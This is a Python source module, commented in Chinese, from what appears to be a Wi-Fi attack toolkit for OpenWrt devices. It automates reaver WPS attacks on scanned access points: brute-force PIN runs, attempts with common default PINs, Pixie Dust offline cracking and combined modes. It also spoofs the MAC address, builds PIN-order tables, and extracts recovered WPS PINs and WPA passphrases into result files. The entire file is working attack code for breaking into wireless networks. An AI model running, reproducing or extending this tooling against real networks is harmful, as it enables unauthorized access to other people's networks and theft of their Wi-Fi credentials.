"""OpenWrt Reaver/WPS 任务接口。"""

import random
import re
import time
from dataclasses import dataclass
from pathlib import Path, PurePosixPath

from modules.capture_services.openwrt.command_builder import (
    normalize_bssid,
    normalize_channel,
    quote_argument,
)
from modules.capture_services.openwrt.result_converter import final_results_dir, safe_result_stem


_PIN_RE = re.compile(r"WPS PIN:\s*(.+)", re.IGNORECASE)
_PSK_RE = re.compile(r"WPA PSK:\s*(.+)", re.IGNORECASE)

# 附加参数白名单：无值开关与带数值开关。-i/-b/-c/-s/-p/-m/-K/信道类由程序控制，
# 一律拒绝，避免用户输入改写关键目标参数；长选项全部拒绝。
_EXTRA_FLAG_OK = frozenset({"-S", "-N", "-E", "-L", "-P", "-q", "-v"})
_EXTRA_VALUE_OK = {
    "-l": (1, 1000),
    "-d": (0, 100),
    "-t": (0, 100),
    "-T": (1, 3600),
    "-r": (1, 100),
    "-x": (1, 86400),
    "-g": (1, 100),
}

# 秒 Pin 兜底常用默认 PIN（用户 partial 优先）；尽力而为，不保证命中。
_COMMON_PINS = ("12345670", "00000000", "11111111", "22222222", "88888888")


@dataclass(frozen=True)
class WpsTargetResult:
    """单个目标的 Pin 结局：PIN 与密码只写结果文件，不进消息与快照。"""

    bssid: str
    ssid: str
    mode: str = ""
    pin_ok: bool = False
    psk_ok: bool = False
    tried_seconds: int = 0
    result_file: str = ""
    wpc_file: str = ""
    note: str = ""


@dataclass(frozen=True)
class WpsUpdate:
    """W worker 发给主线程的进度，不携带 PIN 与密码内容。"""

    elapsed: int
    total: int
    target_label: str = ""
    target_index: int = 0
    target_total: int = 0
    phase: str = ""


class OpenWrtWpsCapture:
    """普通 Pin、快速 Pin、Pixie Dust 和会话恢复的统一后端边界。"""

    def __init__(self, command_runner, process_manager):
        self.command_runner = command_runner
        self.process_manager = process_manager

    @staticmethod
    def sanitize_extra_args(text):
        """把用户附加参数限制在白名单内，返回可拼接的命令片段。

        参数 text 是设置页原文。非法 token 直接抛错（不静默丢弃，避免用户以为
        生效）。数值开关钳制到允许范围。
        """

        parts = []
        tokens = str(text or "").strip().split()
        index = 0
        while index < len(tokens):
            token = tokens[index]
            if token in _EXTRA_FLAG_OK:
                parts.append(token)
                index += 1
            elif token in _EXTRA_VALUE_OK:
                if index + 1 >= len(tokens):
                    raise RuntimeError(f"附加参数 {token} 缺少数值。")
                try:
                    number = float(tokens[index + 1])
                except (TypeError, ValueError):
                    raise RuntimeError(f"附加参数 {token} 的数值不正确：{tokens[index + 1]}。")
                low, high = _EXTRA_VALUE_OK[token]
                number = max(low, min(number, high))
                value = str(int(number)) if number.is_integer() else str(number)
                parts.extend([token, value])
                index += 2
            else:
                raise RuntimeError(
                    f"附加参数不允许：{token}（-i/-b/-c/-s/-p/-m/-K 由程序控制，长选项不支持）。"
                )
        return " ".join(parts)

    def run_targets(
        self,
        workspace,
        monitor_interface,
        session_id,
        targets,
        mode,
        options,
        local_output_dir,
        workspace_manager,
        cancel_event=None,
        progress_callback=None,
    ):
        """对多个已扫描目标逐个跑 Pin，返回每目标结局元组。

        参数：mode 是 normal/second/offline/combo；options 是 WPS 设置字典；
        其余与 H 任务同义。副作用：在远端工作目录运行 reaver，结束下载 .wpc。
        """

        local_output_dir = Path(local_output_dir)
        results = []
        for index, target in enumerate(targets):
            self._check_cancel(cancel_event)
            results.append(
                self._run_single(
                    workspace,
                    monitor_interface,
                    session_id,
                    target,
                    mode,
                    options,
                    local_output_dir,
                    workspace_manager,
                    index,
                    len(targets),
                    cancel_event,
                    progress_callback,
                )
            )
        return tuple(results)

    def _run_single(
        self,
        workspace,
        monitor_interface,
        session_id,
        target,
        mode,
        options,
        local_output_dir,
        workspace_manager,
        index,
        total_targets,
        cancel_event,
        progress_callback,
    ):
        """跑单个目标：按模式组装多阶段 reaver 调用并解析输出。"""

        try:
            bssid = normalize_bssid(target.bssid)
            channel = normalize_channel(target.channel)
        except ValueError as exc:
            return WpsTargetResult(
                bssid=str(target.bssid or ""), ssid=str(target.ssid or ""),
                mode=mode, note=f"目标参数不正确，跳过：{exc}",
            )
        ssid = str(target.ssid or "").strip() or bssid
        label = ssid
        if not bool(getattr(target, "wps_supported", False)):
            return WpsTargetResult(
                bssid=bssid, ssid=ssid, mode=mode,
                note="目标不支持 WPS，跳过。",
            )
        if bool(getattr(target, "wps_locked", False)):
            return WpsTargetResult(
                bssid=bssid, ssid=ssid, mode=mode,
                note="目标 WPS 已锁定，硬跑只会浪费时间，跳过。",
            )
        attack_seconds = max(10, min(int(options.get("attack_seconds", 60) or 60), 3600))
        attack_rounds = max(1, min(int(options.get("attack_rounds", 1) or 1), 20))
        # 恢复文件只做准入校验（存在、非空、不超过 1MB），不猜 reaver 私有格式；
        # 坏了就当没有并记因，不阻断任务。
        resume_note = ""
        resume_path = str(options.get("resume_file", "") or "").strip()
        if resume_path and not self._wpc_readable(resume_path):
            resume_note = "恢复文件损坏或不可读，已忽略本次恢复。"
            options = dict(options, resume_file="")
        total_budget = attack_seconds * attack_rounds
        deadline = time.monotonic() + total_budget
        tried = [0]

        def report(phase):
            if progress_callback is not None:
                elapsed = min(total_budget, int(time.monotonic() - (deadline - total_budget)))
                progress_callback(
                    WpsUpdate(
                        elapsed=elapsed, total=total_budget, target_label=label,
                        target_index=index, target_total=total_targets, phase=phase,
                    )
                )

        def run_phase(args, phase, budget):
            """跑一轮 reaver，返回 (pin, psk)，超时/取消返回空。"""

            pin, psk = None, None
            end = min(deadline, time.monotonic() + budget)
            handle = self.process_manager.start(
                "reaver", args, f"{session_id}-wps{index}",
                str(workspace.remote_dir), cancel_event,
            )
            try:
                while time.monotonic() < end:
                    self._check_cancel(cancel_event)
                    if not self.process_manager.is_running(handle, cancel_event):
                        break
                    tail = self.process_manager.read_log_tail(handle, 100, cancel_event)
                    pin, psk = self._scan_output(tail, pin, psk)
                    if psk:
                        break
                    report(phase)
                    time.sleep(2)
                tail = self.process_manager.read_log_tail(handle, 100, None)
                pin, psk = self._scan_output(tail, pin, psk)
            finally:
                try:
                    self.process_manager.stop(handle, cancel_event)
                except Exception:
                    pass
            tried[0] = min(total_budget, int(time.monotonic() - (deadline - total_budget)))
            return pin, psk

        base = self._base_args(
            workspace, monitor_interface, target, mode, options, workspace_manager,
            cancel_event,
        )
        pin, psk = None, None
        if mode == "second":
            for candidate in self._second_pins(options):
                self._check_cancel(cancel_event)
                if time.monotonic() >= deadline:
                    break
                pin, psk = run_phase(f"{base} -p {quote_argument(candidate)}", "秒Pin", attack_seconds)
                if psk or pin:
                    pin = pin or candidate
                    break
        elif mode == "offline":
            pin, psk = run_phase(f"{base} -K 1", "离线Pin", total_budget)
            if pin and not psk and time.monotonic() < deadline:
                pin2, psk2 = run_phase(
                    f"{base} -p {quote_argument(pin)}", "秒Pin", min(attack_seconds, max(0, deadline - time.monotonic()))
                )
                pin, psk = pin2 or pin, psk2
        elif mode == "combo":
            for candidate in self._second_pins(options):
                self._check_cancel(cancel_event)
                if time.monotonic() >= deadline:
                    break
                pin, psk = run_phase(f"{base} -p {quote_argument(candidate)}", "秒Pin", attack_seconds)
                if psk or pin:
                    pin = pin or candidate
                    break
            if not psk and time.monotonic() < deadline:
                pin, psk = run_phase(f"{base} -K 1", "离线Pin", max(0, deadline - time.monotonic()))
                if pin and not psk and time.monotonic() < deadline:
                    pin2, psk2 = run_phase(
                        f"{base} -p {quote_argument(pin)}", "秒Pin", max(0, deadline - time.monotonic())
                    )
                    pin, psk = pin2 or pin, psk2
        else:
            for _wheel in range(attack_rounds):
                self._check_cancel(cancel_event)
                if time.monotonic() >= deadline:
                    break
                pin, psk = run_phase(base, "常规Pin", attack_seconds)
                if psk or pin:
                    break
        wpc_file = self._download_wpc(
            workspace, workspace_manager, bssid, local_output_dir, cancel_event
        )
        result_file = ""
        if pin or psk:
            stem = safe_result_stem(ssid, bssid)
            out_path = final_results_dir(local_output_dir) / f"{stem}-wps.txt"
            # PIN 与密码只写结果文件，不进日志、消息和快照。
            lines = [f"MAC地址: {bssid}", f"信号名称: {ssid}", f"PIN码: {pin or ''}"]
            if psk:
                lines.append(f"密码: {psk}")
            else:
                lines.append("提示：仅拿到 PIN，可用该 PIN 连接或再跑一次。")
            out_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
            result_file = str(out_path)
        note = resume_note
        if not pin and not psk:
            note = "；".join(filter(None, [note, "本轮未跑出 PIN 或密码。"]))
        report("结束")
        return WpsTargetResult(
            bssid=bssid, ssid=ssid, mode=mode,
            pin_ok=bool(pin), psk_ok=bool(psk), tried_seconds=tried[0],
            result_file=result_file, wpc_file=wpc_file, note=note,
        )

    @staticmethod
    def _scan_output(text, pin, psk):
        """从 reaver 日志文本提取 PIN/PSK，已有值的不覆盖为空。"""

        for line in str(text or "").splitlines():
            match = _PIN_RE.search(line)
            if match:
                value = match.group(1).strip().strip(" '\"")
                if value:
                    pin = value
            match = _PSK_RE.search(line)
            if match:
                value = match.group(1).strip().strip(" '\"")
                if value:
                    psk = value
        return pin, psk

    @staticmethod
    def _second_pins(options):
        """秒 Pin 候选 PIN：用户 partial 优先，否则内置常见默认。"""

        partial = re.sub(r"\D", "", str(options.get("partial_pin", "") or ""))
        if partial:
            return (partial,)
        return _COMMON_PINS

    def _base_args(
        self, workspace, monitor_interface, target, run_mode, options,
        workspace_manager, cancel_event,
    ):
        """组装 reaver 公共参数（含会话恢复与伪装），返回完整命令。"""

        bssid = normalize_bssid(target.bssid)
        channel = normalize_channel(target.channel)
        parts = [
            f"cd {quote_argument(str(workspace.remote_dir))} &&",
            "reaver",
            "-n",
            f"-i {quote_argument(monitor_interface)}",
            f"-b {quote_argument(bssid)}",
            f"-c {channel}",
            "-vv",
            "-f",
            f"-d {max(0, min(int(options.get('pin_speed', 1) or 1), 100))}",
            # Mint 误把速率同时填进 -t；这里 -t 必须用超时时间。
            f"-t {max(0, min(int(options.get('pin_timeout', 5) or 5), 100))}",
        ]
        if str(getattr(target, "band", "2.4G") or "2.4G") == "5G":
            parts.append("-5")
        if bool(options.get("spoof_mac_enabled", False)):
            try:
                mac = normalize_bssid(options.get("spoof_mac", ""))
            except ValueError as exc:
                raise RuntimeError(f"伪装 MAC 格式不正确：{exc}")
            parts.extend(["-m", quote_argument(mac)])
        resume = str(options.get("resume_file", "") or "").strip()
        if resume:
            remote_resume = PurePosixPath(workspace.remote_dir) / "resume.wpc"
            workspace_manager.upload_atomic(Path(resume), remote_resume)
            parts.extend(["-s", quote_argument(str(remote_resume))])
        elif run_mode == "normal":
            # 排序表只用于常规 Pin；秒 Pin/离线 Pin 用 -p/-K 直跑。
            order_file = self._build_order_wpc(
                options, bssid, workspace, workspace_manager, cancel_event
            )
            if order_file:
                parts.extend(["-s", quote_argument(order_file)])
        extra = self.sanitize_extra_args(options.get("additional_args", ""))
        if extra:
            parts.append(extra)
        return " ".join(parts)

    def _build_order_wpc(self, options, bssid, workspace, workspace_manager, cancel_event):
        """按 PIN 排序生成远端 .wpc，返回远端路径；排序非法返回空串。

        复刻 Mint 的排序表逻辑：10 位数字排列＋随机开关；非法时不阻断主流程。
        """

        number_str = re.sub(r"\D", "", str(options.get("pin_order", "") or ""))
        if not number_str:
            number_str = "0123456789"
        if len(number_str) != 10 or sorted(number_str) != sorted("0123456789"):
            return ""
        pins = [f"{int(digit) * 1000 + offset:04d}" for digit in number_str for offset in range(1000)]
        if bool(options.get("random_order", False)):
            random.shuffle(pins)
        local = Path(workspace.local_dir) / f"{bssid.replace(':', '').upper()}.wpc"
        try:
            local.parent.mkdir(parents=True, exist_ok=True)
            local.write_text("\n".join(pins) + "\n", encoding="ascii")
            remote = PurePosixPath(workspace.remote_dir) / local.name
            workspace_manager.upload_atomic(local, remote)
        except (OSError, ValueError):
            return ""
        return str(remote)

    @staticmethod
    def _wpc_readable(path):
        """wpc 准入校验：存在、非空、不超过 1MB；不猜内部格式。"""

        try:
            size = Path(path).stat().st_size
        except OSError:
            return False
        return 0 < size <= 1024 * 1024

    def _download_wpc(self, workspace, workspace_manager, bssid, local_output_dir, cancel_event):
        """下载 reaver 会话 .wpc，缺失或损坏返回空串，不阻断主流程。"""

        name = f"{bssid.replace(':', '').upper()}.wpc"
        remote = PurePosixPath(workspace.remote_dir) / name
        local = final_results_dir(local_output_dir) / name
        try:
            workspace_manager.download_atomic(remote, local)
        except Exception:
            return ""
        if not self._wpc_readable(str(local)):
            try:
                local.unlink()
            except OSError:
                pass
            return ""
        return str(local)

    @staticmethod
    def _check_cancel(cancel_event):
        if cancel_event is not None and cancel_event.is_set():
            raise RuntimeError("WPS 任务已取消。")
